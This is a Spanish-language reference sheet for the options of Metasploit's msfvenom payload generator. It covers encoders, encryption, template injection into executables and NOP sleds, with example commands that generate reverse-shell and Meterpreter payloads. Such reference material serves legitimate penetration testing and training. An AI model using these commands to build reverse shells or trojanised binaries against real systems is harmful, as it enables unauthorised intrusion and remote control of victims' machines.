# Metasploit - MSFvenom -h

## Opciones principales

### 1. Listado y enumeración

|Opción|Descripción|
|---|---|
|`-l, --list <tipo>`|Lista todos los módulos del tipo indicado. Tipos admitidos: `payloads`, `encoders`, `nops`, `platforms`, `archs`, `encrypt`, `formats`, `all`.|
|`--list-options`|Muestra las opciones estándar, avanzadas y de evasión del payload seleccionado.|

### 2. Selección de payload

|Opción|Descripción|
|---|---|
|`-p, --payload <payload>`|Payload a utilizar. Use `--list payloads` para ver la lista completa o `-` / `STDIN` para uno personalizado.|
|`--platform <plataforma>`|Plataforma destino (vea `--list platforms`).|
|`-a, --arch <arquitectura>`|Arquitectura (vea `--list archs`).|

### 3. Formato de salida y codificación

|Opción|Descripción|
|---|---|
|`-f, --format <formato>`|Formato de salida (vea `--list formats`).|
|`-e, --encoder <encoder>`|Encoder a aplicar (vea `--list encoders`).|
|`--smallest`|Intenta generar el payload más pequeño posible.|
|`--encrypt <tipo>`|Aplica cifrado/codificación adicional (vea `--list encrypt`).|
|`--encrypt-key <clave>`|Clave para `--encrypt`.|
|`--encrypt-iv <vector>`|Vector de inicialización para `--encrypt`.|

### 4. Archivo de salida y plantillas

|Opción|Descripción|
|---|---|
|`-o, --out <ruta>`|Guarda el payload generado en el archivo indicado.|
|`-x, --template <ruta>`|Ejecutable personalizado a usar como plantilla.|
|`-k, --keep`|Preserva el comportamiento original de la plantilla e inyecta el payload como nuevo hilo.|
|`--service-name <nombre>`|Nombre de servicio al generar un binario de servicio.|
|`--sec-name <nombre>`|Nombre de sección para binarios grandes de Windows (por defecto, cadena aleatoria de 4 caracteres).|

### 5. Ajustes de tamaño y _nopsled_

|Opción|Descripción|
|---|---|
|`-s, --space <longitud>`|Tamaño máximo del payload resultante.|
|`--encoder-space <longitud>`|Tamaño máximo tras codificación (por defecto, valor de `-s`).|
|`-n, --nopsled <longitud>`|Prependa un _nopsled_ de la longitud indicada.|
|`--pad-nops`|Usa la longitud de `-n` como tamaño total del payload, completando con _NOPs_ automáticamente.|
|`-b, --bad-chars <lista>`|Caracteres a evitar, p. ej. `\x00\xff`.|

### 6. Codificación múltiple y shellcode adicional

|Opción|Descripción|
|---|---|
|`-i, --iterations <n>`|Número de veces que se codificará el payload (encadenado de encoders).|
|`-c, --add-code <ruta>`|Archivo extra de shellcode Win32 a incluir.|

### 7. Lectura desde STDIN y tiempos

|Opción|Descripción|
|---|---|
|`-t, --timeout <seg>`|Tiempo de espera al leer payload desde STDIN (30 s por defecto, 0 para desactivar).|
|`-v, --var-name <nombre>`|Nombre de variable personalizado en ciertos formatos de salida.|

### 8. Miscelánea

|Opción|Descripción|
|---|---|
|`--pad-nops`|Ajusta automáticamente el _nopsled_ para igualar el tamaño deseado.|
|`-h, --help`|Muestra la ayuda y termina.|

---

## Notas rápidas

- **Listar payloads disponibles**
    
    ```bash
    msfvenom --list payloads | less
    ```
    
- **Ver opciones específicas de un payload**
    
    ```bash
    msfvenom --payload windows/x64/shell_reverse_tcp --list-options
    ```
    
- **Evitar bytes nulos** (`\x00`) y saltos de línea (`\x0a\x0d`)
    
    ```bash
    msfvenom -p linux/x64/exec CMD=id -b '\x00\x0a\x0d'
    ```
    
- **Reducir tamaño al mínimo**
    
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=… -f raw --smallest
    ```


1QNDjGuBDc